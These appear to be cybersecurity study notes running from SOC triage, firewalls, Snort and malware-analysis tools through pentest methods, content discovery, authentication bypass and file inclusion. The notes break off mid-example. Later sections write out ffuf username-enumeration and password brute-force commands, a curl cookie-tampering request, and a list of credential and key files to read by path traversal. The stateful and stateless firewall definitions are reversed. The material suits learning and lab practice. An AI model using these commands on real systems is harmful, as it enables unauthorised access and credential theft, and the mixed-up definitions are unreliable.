Analysts spend most of their time on the dashboards, watching for triggers. Once an alert is triggered, the events/flows associated are examined, while the rule is checked to see which conditions are met. This process can be broken down as follows:
1. If alert is a False Alarm, which may required tuning of the rule; if alert is a True Positive, perform further investigation.
2. Contact asset owner to inquire about the activity.
3. If suspicious activity is confirmed, isolate the infected host.
4. Block the suspicious IP.

## Firewalls
A *firewall* inspects a network/device's incoming and outgoing traffic, which then allows or denies based on specific rules. 

Firewalls can be cateogrised into different types:
+ Stateful - determines the behaviour of a device based on the entire connection; filters the data based on predetermined rules, without considering the state of previous connections; operates at OSI layer 3 and 4
+ Stateless - determines whether individual packets are acceptable or not; keeps track of previous connections and stores them in a state table; operates at OSI layer 3 and 4
+ Proxy - act as intermediaries between private networks and the Internate; inspects the content of packets and apply content filtering; operates at the OSI layer 7
+ Next-Generation (NGFW) - offers deep packet inspection, IPS, heuristic analysis, SSL/TLS decryption; operates at OSI layer 3 to 7

An administrator can permit or deny traffic based on these factors:
+ Source of traffic
+ Destination of traffic
+ Destination port
+ Protocol being used
+ Direction

Three actions can be applied to firewall rules:
+ Allow - permit traffic
+ Deny - block traffic
+ Forward - redirects traffic to a different network segment

Rules can be categorised by direction:
+ Inbound - incoming traffic
+ Outbound - outgoing traffic
+ Forward - forward traffic inside a network

### E.g. Windows Defender Firewall
*Windows Defender Firewall* can create rules that can restrict incoming and outgoing network traffic. 

There are two available network profiles:
+ Private networks - includes configurations to apply when connected to home networks
+ Guest or public networks - includes configurations to apply when connected to public or untrusted networks (e.g. coffee shops, free Wi-Fi)

Custom rules can be created in Advanced Settings.

### E.g. Linux iptables Firewall
For Linux, there are multiple fire wall options available.

*Netfilter* is the framework within Linux OS with core firewall functionalities (i.e. packet filtering, NAT, connection tracking). Some common firewall utilities include:
+ iptables - most widely used utility
+ nftables - successor to iptables with enhanced packet filtering and NAT capabilities
+ firewalld - has predefined rule sets

*Uncomplicated Firewall (ufw)* provides an easier interface (i.e. easier commands). Common commands include:
+ **sudo uft status** - check firewall status; add **numbered** to list down all active rules
+ **sudo ufw enable** - enable firewall; use **disable** to disable
+ **sudo ufw default allow outgoing** - allow outgoing connections as a default policy; use **incoming** for inbound connections
+ **sudo ufw deny 22/tcp** - block tcp port 22; switch port and transport protocol as needed
+ **sudo ufw delete 2** - delete a specific rule (i.e. based from numbers from sudo uft status numbered)

## IDS
*Intrustion Detection Systems (IDS)* monitors for abnormal traffic and notifies security administrators. 

These can be deployed in two ways:
+ Host Intrusion Detection System (HIDS) - installed individually and detects threats on a particular host; provide visibility on host's activities
+ Network Intrusion Detection System (NIDS) - detecting threats within the whole network; provides a centralised view of all network detections

IDS can classified into different detection modes:
+ Signature-based - attacks are detected by their signature/pattern, which are saved in the IDS database; not particularly useful for zero-day attacks
+ Anomaly-based - compares abnormal activity from a normal/baseline behaviour of a network or system; can detect zero-day attacks; prone to generate false positives
+ Hybrid - combines the detection methods (i.e. signature and anomly-based)

### E.g. Snort
*Snort* is an open-source IDS that uses signature- and anomaly-based threat detection. Several built-in tools come pre-installed with the tool. Custom rules can also be made depending on requirements. 

Snort has several modes:
+ Packet sniffer mode - reads and displays network packets without performing analysis; can be helpful in network monitoring and troubleshooting (i.e. diagnosing issues)
+ Packet logging mode - detects real-time network traffic and displays them as alerts for security administrators; also allows packet logging as PCAP files for offline analysis
+ Network Intrusion Detection System mode - primary mode that monitors network traffic in real-time and applies rule files to identify and match traffic to known attack patterns; successful matches will generate alerts

Snort built-in rules, configuration, and other files can be found in /*etc/snort* directory. The *snort.conf* file is particularly useful for rule enabling and network range configuration settings. The *rules* folder contains the rule files.

#### Rule Creation
Rules follow a specific format: [action] [protocol] [source_ip] [source_port] -> [destination_ip] [destination port] rule_metadata([msg; sid, rev])
+ action - specifies which action to take (e.g. alert)
+ protocol - refers to the protocol that matches the rule (e.g. ICMP)
+ source ip/port - determine the IP/port from which the traffic originates (e.g. any)
+ destination ip/port - specifies the destination IP/port to which the traffic goes to
+ rule metadata - defined with the following components:
  + msg - describes message to be displayed when rule is triggered (e.g. "Ping detected")
  + sid - unique identifier
  + rev - revision number of the rule

E.g. alert icmp any any -> 127.0.0.1 any (msg:"Loopback Ping Detected"; sid:10003; rev:1;)

#### Rule Testing
The following example command tests alerting for ICMP packets to the loopback address:
```
sudo snort -q -l /var/log/snort -i lo -A console -c /etc/snort/snort.conf
```
Commands such as these can also be used for PCAP files:
```
sudo snort -q -l /var/log/snort -r Task.pcap -A console -c /etc/snort/snort.conf
```

## Vulnerability Scanning
### Vulnerabilities
*Vulnerabilities* are weaknesses in software programs or hardware that can be leveraged by attackers. *Patching* is the process of fixing these vulnerabilities.

However, these vulnerabilities must be scanned for. These scans can be categorised into the following:
+ Authenticated vs Unauthenticated Scans

| Authenticated | Unauthenticated |
| :------: | :-----: |
| Credentials must be provided to the scanner | Only IP address is needed |
| Exploited by attackers that have access to the host | Exploited by attackers that have no access to the host |
| Provides deeper visibility to the target system by scanning configurations and installed applications | Less resource-intensive and easy to configure |
| E.g. providing internal database credentials to scanner | E.g. scanning a public-facing website for vulnerabilities |
+ Internal vs External Scans

| Internal | External |
| :------: | :-----: |
| Conducted from inside the network | Conducted from the outside of the network |
| Focuses on vulnerabilities to be exploited inside the network | Focuses on vulnerabilities to be exploited from outside the network |
| Identifies vulnerabilities once an attacker gets inside a network | Identifies vulnerabilities for attackers outside the network |

### Vulnerability Research
Some automated ulnerability scanning tools include:
+ [Nessus](https://www.tenable.com/products/nessus) - provides extensive vulnerability scanning options for large enterprises; has both free and paid versions
+ [Qualys](https://www.qualys.com/) - provides compliance checks and asset management along with continuous scanning; cloud-based
+ [Nexpose](https://www.rapid7.com/products/nexpose/) - continuously discovers new network assets, scans them, and provides a vulnerability risk score; also provides compliance checks; offers on-premises and hybrid (i.e. cloud + on-premises) deployment
+ [OpenVAS](https://www.openvas.org/) - offers basic features with known vulnerabilities scanned through its database; less extensive but is beneficial for small organisations and invidivudal systems

Manual scanning involves using the same techniques as automated scans. These involve testing for the following:

| Vulnerability | Description |
| :------: | :-----: |
| Security Misconfigurations | Due to developer oversigh (e.g. exposing server information) |
| Broken Access Control | Attackers can access confidential parts |
| Insecure Deserialisation | Insecure processing of data sent across applications (e.g. passing malicious code) |
| Injection | Attackers input malicious data into applications |

Other useful tools include:
+ [Rapid7](https://www.rapid7.com/db/) - vulnerability research database; contains instructions for exploiting applications using Metasploit
+ Github - useful for finding PoCs and fresh exploits
+ Searchsploit - offline copy of Exploit-Db; available in Kali Linux

### CVE
*Common Vulnerabilities and Exposures (CVE)* is a unique identifier given to software vulnerabilities. Developed by the MITRE Corporation, these CVE numbers are published online in a database. 

E.g. CVE-2024-9374
+ CVE prefix - each CVE has "CVE" in the beginning
+ Year - contains the year it was discovered
+ Arbitrary digits - contains four or more arbitrary digits

### CVSS
*Common Vulnerability Scoring System (CVSS)* is a score that provide the severity of a vulnerability. It is calculated by factoring its impact, easy of exploitability, etc.

A summary of scores is as follows:

| CVSS Range | Severity Level |
| :------: | :-----: |
| 0.0 to 3.9 | Low |
| 4.0 to 6.9 | Medium |
| 7.0 to 8.9 | High |
| 9.0 to 10 | Critical |

### VPR 
*Vulnerability Priority Rating (VPR) gives a score with a heavy focus on the risk of a vulnerability pertaining to the organisation itself, rather than impact (i.e. different from CVSS). This considers relevancy (i.e. no risk if not applicable).

Score ranges are as follows:

| VPR Score| Rating |
| :------: | :-----: |
| 0.0 to 3.9 | Low |
| 4.0 to 6.9 | Medium |
| 7.0 to 8.9 | High |
| 9.0 to 10 | Critical |

### Vulnerability Databases
These are some resources that keep track of vulnerabilities:
+ [National Vulnerability Database (NVD)](https://nvd.nist.gov/)
+ [Exploit-DB](https://www.exploit-db.com/)

### E.g. Scanning w/ OpenVAS
Install OpenVAS using Docker.
```
sudo apt install docker.io
```
```
sudo docker run -d -p 443:443 --name openvas mikesplain/openvas
```
Access OpenVAS through the browser at *https://127.0.0.1*

## CyberChef
*CyberChef* is a web-based application tool that can do encoding and decoding. It is often referred to as a "Swiss Army Knife" for data. This tool can be accessed [online](https://gchq.github.io/CyberChef/) or [downloaded locally](https://github.com/gchq/CyberChef/releases).

### Navigating the Interface
CyberChef has four areas:
+ Operations - repository of operations that can be performed (e.g. From Morse Code, URL Encode, To Base64, etc)
+ Recipe - where operations can be selected, arranged, and fine-tuned
+ Input - where input text or files can be placed (i.e. by typing, pasting, uploading)
+ Output - displays the data processing results

### Process
To use CyberChef effectively, follow these four steps:
1. Set a clear objective
2. Enter data into the input area
3. Select the operations to use
4. Verify the output to check for intended results; repeat step one to three otherwise

### Common Tools
Refer to these commonly used operation categories:
+ Extractors

| Specific | Description |
| :------: | :-----: |
| Extract IP addresses | Extract all IPv4 and IPv6 addresses from input |
| Extract URLs | Extract URL from input; Note: the protocol (i.e. HTTP, FTP) is required |
| Extract email addresses | Extract all email addresses from input |

+ Date and Time

| Specific | Description |
| :------: | :-----: |
| From UNIX timestamp | Converts UNIX timestamp to datetime string |
| To UNIX timestamp | Parses a datetime string in UTC and returns a UNIX timestamp |

+ Data Format

| Specific | Description | Example |
| :------: | :---------: | :-----: |
| From Base64 | Decodes data from ASCII Base64 to raw format | V2VsY29tZSB0byB0cnloYWNrbWUh becomes Welcome to tryhackme! |
| URL Decode | Converts URL percent-encoded characters to raw value | https%3A%2F%2Fgchq%2Egithub%2Eio%2FCyberChef%2F becomes https://gchq.github.io/CyberChef/ |
| From Base85 | More efficient than Base64, using preset/alphabet of your choosing | BOu!rD]j7BEbo7 becomes hello world |
| From Base58 | Differs from Base64 by removing misread characters (i.e. I and l, 0 and O) | AXLU7qR becomes Thm58 |
| To Base58 | Encodes using restricted set of symbols | Thm62 becomes 6NiRkOY |

## CAPA
*Common Analysis Platform for Artifacts (CAPA)* is a tool that can identify the capabilities present in executable files (e.g. PE executables, ELF binaries, .NET modules, shellcodes, sandbox reports). It is capable of conducting static analysis by applying rules to describe common behaviours, which can determine a program's capability (e.g. network communication, file manipulation, process injection, etc)

Main command: **capa ./[executable_file]**

Some useful commands include:
+ **-h** - shows help message
+ **-v** - shows verbose results; use **-vv** for more verbose output

Results from running CAPA can be divided into the parts below.

### General Information
The first block contains basic information, including:
+ Cryptographic algorithms (i.e. md5, sha1, sha256)
+ analysis (i.e. static)
+ os
+ arch (i.e. determine whether binary related to x86 architecture)
+ path

### MITRE ATT&CK
References to the MITRE framework, which can aid in mapping a file's behaviour. 

| Format | Example |
| :------: | :-----: |
| ATT&CK Tactic::ATT&CK Technique::Technique Identifier | Defense Evasion::Obfuscated Files or Information::T1027 |
| ATT&CK Tactic::ATT&CK Technique::ATT&CK Sub-Technique::Technique Identifier[.]Sub-technique Identifier | Defense Evasion::Obfuscated Files or Information::Indicator Removal from Tools T1027.005 |

### MAEC
Malware Attribute Enumeration and Characterisation (MAEC) is a specialised language used to encode and communicate complex details concerning malware. 

The two most commonly used MAEC values are:

| MAEC Value | Behaviour |
| :------: | :-----: |
| Launcher | Dropping additional payloads, activating persistence, connecting to C2C, executing specific functions |
| Downloader | Fetching additional payloads, pulling updates, executing secondary stages, retrieving configuration files |

### MBC
The Malware Behaviour Catalogue (MBC) serves as a catalogue for malware objectives and bheaviours. 

| Format | Example |
| :------: | :-----: |
| OBJECTIVE::Behavior::Method[Identifier] | ANTI-STATIC ANALYSIS::Executable Code Obfuscation::Argument Obfuscation [B0032.020] |
| OBJECTIVE::Behavior::[Identifier] | COMMUNICATION::HTTP Communication:: [C0002] |

The parts can be broken down into the following:
+ Objective - characterises malware based from the ATT&CK tactics (e.g. Anti-Behavioral Analysis, Anti-Static Analysis, Collection, Command and Control, etc)
+ Micro-Objective - refer to action/s that may not be necessarily malicious (e.g. PROCESS, MEMORY, COMMUNICATION, DATA)
+ Behaviors - contains behaviors and micro-behaviors with or without methods and identifiers (e.g. Virtual Machine Detection, Executable Code Obfuscation, File and Directory Discovery)
+ Micro-Behavior - similar to micro-objectives relating to behaviours (e.g. Allocate Memory, Create Process, HTTP)
+ Methods - tied to behaviors (e.g. Argument Obfuscation, Stack Strings, Read Header, Base64, XOR)

### Namespaces & Capabilities
CAPA uses namespaces to group items with the same purpose. Capabilities are simply the name of the associated rule.

| Format | Example |
| :------: | :-----: |
| Capability(Rule Name)::TLN(Top-Level Namespace)/Namespace | reference anti-VM strings::Anti-Analysis/anti-vm/vm-detection |

For the example above is broken down as follows:
+ Anti-Analysis is the TLN.
+ anti-vm/vm-detection and obfuscation are grouped namespaces, each having their own collection of rules
+ reference-anti-vm-strings-targeting-virtualbox.yml and reference-anti-vm-strings-targeting-virtualpc.yml contain the rules

## REMnux
The *REMnux VM* is a Linux distro specifically designed to provide a sandbox-like environment for analysing malware. It includes tools like Volatility, YARA, Wireshark, oledump, and INETSim.

### Use Case: File Analysis
*oledump.py* can be used to conduct static analysis on potentially malicious Object Linking and Embedding (OLE2) files, which is proprietary technology of Microsoft. These files are used to store multiple data types (e.g. documents, spreadsheets, presentations) into a single file.

Command syntax: **oledump.py [file]**

Common extensions:
+ **-s [number]** - select a specific data stream
+ **--vbadecompress** - automatically decompress VBA macros into a readable format

Note: macros are listed with the presence of a 'M' in the datastream

### Use Case: Fake Network to Aid Analysis
*Internet Services Simulation Suite (INETSim)* can be used to simulate a real network attack by malware. 

Note: configuring the */etc/inetsim/inetsim.conf* is required, particularly changing the *#dns_default_ip* value

Command syntax: **sudo inetsim**

Once done, accessing the IP address through the browser will redirect to the INETSim's homepage. 

From here, usual malware behaviour can be executed (e.g. downloading a binary/script)
```
sudo wget https://MACHINE_IP/second_payload.zip --no-check-certificate
```
When INETSim is stopped, it will create a report on its captured connections. This can be found in the */var/log/inetsim/report/* directory.

### Use Case: Evidence Preprocessing
*Volatility* can be used to identify and extract artefacts from memory images, which results in output that can be saved to text files (e.g. text or JSON) for further analysis.

Command syntax: **vol3 -f [mem_file] [plugin]**

Note: for the examples, a wcry.mem image file will be used

Some parameters/plugins for Windows that can be used include:
+ PsTree
```
vol3 -f wcry.mem windows.pstree.PsTree
```
+ PsList
```
vol3 -f wcry.mem windows.pslist.PsList
```
+ CmdLine
```
vol3 -f wcry.mem windows.cmdline.CmdLine
```
+ FileScan
```
vol3 -f wcry.mem windows.filescan.FileScan
```
+ DllList
```
vol3 -f wcry.mem windows.dlllist.DllList
```
+ Malfind
```
vol3 -f wcry.mem windows.malfind.Malfind
```
+ PsScan
```
vol3 -f wcry.mem windows.psscan.PsScan
```

Note: processing these in bulk using loops is helpful. E.g. 
```
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done
```

The *strings* utility can be used to extract ASCII, 16-bit little-endian, and 16-bit big-endian strings. 
```
strings wcry.strings.ascii.txt
```
```
strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
```
```
strings -e b  wcry.mem > wcry.strings.unicode_big_endian.txt
```

## FlareVM
*Forensice, Logic Analysis, and Reverse Engineering* is a set of specialised tools used in reverse engineering, malware analysis, incident response, forensic investigation, and penetration testing. 

### Use Cases and Tool Kit
Tools are grouped into various categories below:

#### Reverse Engineering & Debugging
Reverse engineering takes a finished software apart and understand how it works. Debugging identifies errors, understand why they happen, and corrects the code.
+ Ghidra - open-source reverse engineering suite
+ x64dbg - open-source debugger for binaries in x64 and x32
+ OllyDbg - debugger for reverse engineering at the assembly level
+ Radare2 - open-source platform for reverse engineering
+ Binary Ninja - disassembler and decompiler for binaries
+ PEiD - packer, cryptor, and compiler detection tool

#### Disassembler & Decompilers
Disassemblers and decompilers aid in understanding malware behaviour by breaking it into understandable formats.
+ CFF Explorer - PE editor designed to analyse PE files
+ Hopper Disassembler - debugger, disassembler, and decompiler
+ RetDec - open-source decompiler for machine code

#### Static & Dynamic Analysis
Static analysis is code inspection without executing it. Dynamic analysis observes code behaviour as it runs.
+ Process Hacker - memory editor and process watcher
+ PEview - PE file viewer for analysis
+ Dependencer Walker - tool for displaying an executable's DLL dependencies
+ Detect It Easy (DIE) - packer, compiler, and cryptor detection tool

#### Forensice & Incident Response
Digital forensics involve collection, analysis, and preservation of digital evidence from various sources. Incident response focuses on detection, containment, eradication, and recovery from cyberattacks.
+ Volatility - RAM dump analysis framework for memory forensics
+ Rekall - framework for memory forensics in incident response
+ FTK Imager - disc image acquisition and analysis tools for forensic use

#### Network Analysis
Network analysis involves uncovering patterns, optimise performance, and understand underlying structure and behaviour of a network.
+ Wireshark - network protocol analyser for traffic recording and examination
+ Nmap - vulnerability detection and network mapping tool
+ Netcat - read and write data across network connections

#### File Analysis
File analysis examines files for potential security threats and ensure proper file permissions.
+ FileInsight - looks through and edits binary files
+ Hex Fiend - Hex editor that is light and quick
+ HxD - binary file viewer and hex editor

#### Scripting & AUtomation
Scripting and automation involves the use of scripts (e.g. PowerShell, Python) to automate tasks and processes.
+ Python - automation-focused on Python modules and tools
+ PowerShell Empire - framework for PowerShell post-exploitation

### Sysinternals Suite
The Sysinternals Suite is a collection of system utitlities for managing, troubleshooting, and diagnosing Windows systems.
+ Autoruns - shows executables that are configured to run during boot-up
+ Process Explorer - provides information about running processes
+ Process Monitor - monitors and logs real-time process/thread activities

### Tools for Investigation
These tools are usued for initial investigations:
| Tool | Investigative Use |
| :------: | :-----: |
| Procmon | Tracks system activity, particularly regarding malware research, troubleshooting, and forensic investigations |
| Process Explorer | Shows Process of the Parent-child relationship, DLLs loaded |
| HxD | Examine/alter malicious files via hex editing |
| Wireshark | Observes and investigates network traffic for unusual activity |
| CFF Explorer | Generates file hashes for integrity verification, authenticate source of system files, and check for validaty |
| PEStudio | Static analysis of executable file properties |
| FLOSS | Extracts and de-obfuscates all strings from malware programs using static analysis techniques |

## Penetration Testing
A *penetration test* is an ethical attempt to analyse the security defenses of a system. It uses the same tools, techniques, and methodologies that malicious actors would use. A pentest is similar to an audit.

Hackers are grouped into three hats, depending on their ethics and motivations:
| Category | Description |
| :------: | :-----: |
| White Hat | Remain within the law and use skills to benefit others |
| Grey Hat | Use skills to benefit others; may not follow the law or ethics at all times |
| Black Hat | Criminals and often seek to damage or gain benefit at the cost of others |

### Rules of Engagement (ROE)
The ROE is a document used in the initial stages of a pentest, primarily to decide how an engagement is to be carried out. This contains three main sections:
1. Permission - gives explicit permission for the engagement to be done; essential for legal protection
2. Test Scope - lists specific targets to which the engagements can apply (e.g. only a segment of the server, not the whole network)
3. Rules - define techniques that are permitted (e.g. no phshing, allow MITM)

### Methodologies
Though no two penetration tests are the same, there is a general stages that tend to show up.

| Category | Description |
| :------: | :-----: |
| Information Gathering | Collecting public information about a target (i.e. OSINT, research) |
| Enumeration/Scanning | Discovering applications and services running on systems (e.g. finding a potentially vulnerable web server) | 
| Exploitation | Leveraging vulnerabilities discovered on a system (e.g. using public exploits, exploiting application logic) |
| Privilege Escalation | Attempt to expand access to the system; Can be either horizontally (i.e. another account with same permission group) or vertically (i.e. another permission group)
| Post Exploitation | Involves pivoting (i.e. finding other targets), gathering additional information, covering tracks, reporting |

#### OSSTMM
The *Open Source Security Testing Methodology Manual (OSSTMM)* is a methodology primarily focusing on how systems communicate. This is particularly useful for:
+ Telecommunications (i.e. phones, VoIP)
+ Wired Networks
+ Wireless communications

Advantages:
+ Covers various testing strategies in-depth
+ Include testing strategies for specific targets (i.e. telecommunications, networking)
+ Flexible

Disadvantages:
+ Difficult to understand, very detailed, and uses unique definitions

#### OWASP
The *Open Web Application Security Project (OWASP)* is used to test the security of web applications and services.

Advantages:
+ Easy to understand
+ Actively maintained and updated
+ Covers all stages of an engagement (i.e. from testing to reporting/remediation)
+ Specialises in web applications and services

Disadvantages:
+ May not be clear on what type of vulnerability is present
+ Does not make suggestions to specific software development life cycles
+ Does not hold any accredditation (e.g. CHECK)

#### NIST Cybersecurity Framework 1.1
The *NIST Cybersecurity Framework* provides guidelines on security controls and benchmarks for organisations. Note: there is a limited section on standard guideline for penetration testers.

Advantages:
+ Around 50% of Americans use this framework
+ Extremely detailed in setting standards for organisations in mitgating cyber threats
+ Frequently updated
+ Provides accredidation
+ Designed to be implemented with other frameworks

Disadvantages:
+ Many iterations, which makes it difficult to decide which should apply
+ Has weak auditing policies, which makes it difficult to determine causes of breaches
+ Does not consider cloud computing

#### NCSC CAF
The *Cyber Assessment Framework (CAF)* uses 14 principles to assess the risk of various cyber threats and an organisation's defences. This applies to critical infrastructure, banking, and other vitally important services. 

Advantages:
+ Backed by a government cybersecurity agency
+ Provides accreditation
+ Covers 14 principles, ranging from security to response

Disadvantages:
+ Still new to the industry
+ Based on principles and ideas and is not as direct as having rules

### Types of Testing
There are three primary scopes when testing an application or service:

| Type of Test | Description |
| :------: | :-----: |
| Black-Box testing | High-level process where the tester is not given any information about the inner workings of the application/service |
| Grey-Box testing | Testers have some limited knowledge of the internal components of the application/service |
| White-Box testing | Low-level process usually done by software developer who knows programming and application logic; tester will have full knowledge of the application and its expected behaviour |

## Walking an Application
Manual review of a web application for security issues can be useful. Automated security tools and scripts often miss potential vulnerabilities and useful information. 

One way to do this is using the in-built tools of your browser. Some tools include:
+ View Source
+ Inspector
+ Debugger
+ Network

### View Page Source
The page source displays human-readable code returned to the browser each time a request is made to the web server. The code is comprised of HTML, CSS, and JavaScript.

Some notable things to watch for:
+ Comments - messages left by the website developer
+ Links - anchor tags provide links to other pages
+ External files - CSS, JavaScript, images can be included in the HTML code
+ Framework - which framework is used and version

### Inspector
Element inspector provides a representation of what is being currently displayed in a browser. Editing and interacting with the page elements is also possible.

### Debugger
This is known as Debugger in Firefox and Safari and as Sources in Chrome. Originally used for web developers, this feature allows closer inspection of JavaScript code.

### Network
The network feature keeps track of external requests a webpage makes. 

## Content Discovery
Content discovery refers to finding things that are not immediately presented (i.e. not intended for public access). For example, these could be pages or portals for staff, older versions of the site, backup files, configuration files, administration panels, etc.

There are three ways for discovering content in websites:
1. Manually
2. Automated
3. OSINT

### Manual Discovery
There are multiple places in a website that can be manually checked.

#### Robots.txt
The *robots.txt* file is a document that tells search engines what they can and can not show in their results. It is common to restrict certain website areas so they are not displayed in search engine results (e.g. administration portals, private files). This file can be found in **[url]/robots.txt**.

#### Favicon
A favicon is the small icon displayed next to the URL or tab in a browser. This is used for branding a website. 

When frameworks are used to build a website, a custom favicon is used. This can give clues on what framework is used. Common framework icons can be checked in this [OWASP database](https://wiki.owasp.org/index.php/OWASP_favicon_database).

Use this command to download the favicon and get its md5 hash value: **curl [favicon_image_url] | md5sum**

#### Sitemap.xml
The *sitemap.xml* file provides a list of every file that is to be listed on search engines. These can sometimes contain areas of the website that are more difficult to navigate to and even some older pages that are still working behind the scenes. This file can be found in **[url]/sitemap.xml**.

#### HTTP Headers
These headers can contain useful information such as webserver software and even programming/scripting language used. 

Use this command: **curl [url] -v**

#### Framework Stack
As mentioned, frameworks can be determined either by matching its favicon or by clues in page source (e.g. comments, copyright notices, credits). Once determined, you can learn more about the software and other information, potentially leading to more content to discover.

### OSINT Discovery
There are external resources that are freely available. 

#### Google Hacking/Dorking
By utilising Google's advanced search engine features, you can pick out custom content. For instance, you can:
+ Pick out results from certain domain name (i.e. using the site: filter)
+ Match this with certain search terms (i.e. site:google.com admin)

Here are more examples of filters:

| Filter | Example | Description |
| :------: | :-----: | :-----: |
| site | site:google.com | returns results only from the specified website address |
| inurl | inurl:admin | returns results that have the specified word in the URL |
| filetype | filetype:pdf | returns results of a particular file extension |
| intitle | intitle:admin | returns results that contain the specified word in the title |

Note: multiple filters can be combined

#### Wappalyzer
[Wappalyzer](https://www.wappalyzer.com/) is an online tool and browser extension that identifies what technologies a website uses (i.e. frameworks, Content Management Systems, payment processors, etc) as well as their version numbers.

#### Wayback Machine
The [Wayback Machine](https://archive.org/web/) is an archive of websites that date back to the late 90s. This service can help uncover old pages that may still be active on the current website.

#### Github
Github can be used to look for company or website names and try to locate repositories belonging to them. Once discovered, you may have access to source code, passwords, and other content.

#### S3 Buckets
S3 Buckets allows people to save files and even static website content in the cloud, which can be accessed over HTTP and HTTPS. Owners of these files can set access permissions (i.e. public, private, writeable), which are sometimes set incorrectly. S3 buckets format is as follows: **http(s)://{name}.s3.amazonaws.com**, where {name} is decided by the owner. 

Note: a common automation method uses a company name followed by common terms. E.g. {name}-assets, {name}-wwww, {name}-public, etc

### Automated Discovery
This process is automated, usually containing large amounts of requests to a webserver. These requests check whether a file or directory exists on a website, potentially giving access to resources previously unknown. These processes utilise wordlists.

Three examples of automated discovery tools:
+ ffuf
```
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ
```
+ dirb
```
dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```
+ Gobuster
```
gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

## Subdomain Enumeration
This is the process of finding subdomains for a domain. This is done to expand attack surfaces to discover more potential points of vulnerabilities.

Three methods can be utilised:
+ Brute Force
+ OSINT
+ Virtual Host

### OSINT
#### SSL/TLS Certificates
When SSL/TLS certificates are created for a domain by the CA, *Certificate Transparency (CT)* logs are created. These are publicly accessible and can be searched in databases such as [crt.sh](https://crt.sh/).

#### Search Engines
Using advanced search methods (e.g. site:*.domain.com -site:www.domain.com) can narrow search results and lead to identifying subdomains.

#### Sublist3r
Abov emethods can be automated using tools such as [Sublist3r](https://github.com/aboul3la/Sublist3r).

### DNS Bruteforce
Bruteforce DNS enumeration is a method of trying multiple different possible subdomains from a pre-defined list (i.e. commonly used subdomains). 

### Virtual Hosts
Some subdomains are not always hosted in publically accessible DNS results (e.g. development versions, administration portals). These could be kept on a private DNS server or recorded on the developer's machines in either */etc/hosts* or *c:\windows\system32\drivers\etc\hosts*, which map domain names to IP addresses.

Note: since webservers can host multiple websites from one server, the host header is used to know which website a client wants

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP
```
```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP -fs {size}
```

## Authentication Bypass
Website authentication can be bypassed in different ways. These are critical as it often results to leaking personal data.

### Username Enumeration
Website error messages are great for building a list of valid usernames, as it verifies that such usernames already exist. 

The ffuf tool below automates this process:
```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
```

### Brute Force
Using the generated valid usernames, a brute force attack on the login page can be made:
```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
```

### Logic Flaw
Authentication processes may sometimes contain logic flaws (i.e. logical path can by bypassed). 

### Cookie Tampering
Examining and editing cookies during an online session can lead to unauthenticated access, access to user's accounts, and elevated privileges.

#### Plain Text Cookies
Contents of cookies can be in plain text, which makes what they do obvious. E.g. Set-Cookie: admin=false; Max-Age=3600; Path=/.

This command alters the cookie to gain admin privileges:
```
curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
```

#### Hashed Cookies
Cookies are sometimes hashed. Common hashing methods used include md5, sha-256, sha-512, and sha1. Databases such as [Crackstation](https://crackstation.net/) are useful in cracking these hashes.

#### Encoded Cookies
Encoded text is reversible. Common encoding types include base32 and base64. E.g. Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/.

## IDOR
*Insecure Direct Object Referencing (IDOR)* is an access control vulnerability, where user-suppied input to retrieve objects (e.g. files, data, documents) are not validated on the server side to confirm that the object belongs to the requesting user. E.g. http://online-service.thm/profile?user_id=1000, where changing id={n} provides access to other profiles.

Web developers often manipulate raw data by:
+ Encoding - from binary to ASCII (e.g. base64)
+ Hashing - hashed version of an integer value (e.g. md5)

Note: for unpredictable IDs, a common technique is creating two accounts and swapping the Id numbers; if the other account content can be viewed, an IDOR vulnerability is present

IDORs can be found beyond the browser URL address bar. Some other locations include:
+ AJAX request
+ JavaScript file reference
+ Unreferenced parameter (e.g. /user/details -> user/details?user_id=123)
+ API calls using Network developer tools

## File Inclusion
*File inclusion* vulnerabilities are often found in web applications that do not sanitise or validate user inputs. Attackers leverage this to access sensitive data through manipulating URL query strings (e.g. http://webapp.thm/get.php?file=userCV.pdf).

### Path/Directory Traversal
This vulnerability allows attackers to read local files or directories on a server. This is done by manipulating input in the URL, which gets passed to functions (e.g file_get_contents in PHP). One way to do this is through the use of **../** to move up directories to reach the root.

Some common OS files to explore when pentesting:

| Location | Description |
| :------: | :-----: |
| /etc/issue | shows a message or system identification before the login prompt |
| /etc/profile | controls system-wide default variables (e.g. Export variables, file creation mask, terminal types, mail messages) | 
| /proc/version | indicates the Linux kernel version | 
| /etc/passwd | shows all registered users in a system |
| /etc/shadow | shows information about the users' passwords | 
| /root/.bash_history | shows history commands for the root user |
| /var/log/dmessage | shows global system messages |
| /var/mail/root | shows all emails for the root user |
| /root/.ssh/id_rsa | shows private SSH keys for the root/valid user | 
| /var/log/apache2/access.log | shows accessed requests for Apache server |
| C:\boot.ini | contains the boot options for systems with BIOS firmware | 

### Local File Inclusion (LFI)
LFI attacks occur due to insecure code. For example, the *include*, *require*, *include_once*, and *require_once* in PHP lead are common culprits. These also occur in other languages such as ASP, JSP, Node.js. 

Some scenarions include:
+ No specified directory in the include; no input validation. E.g.
```
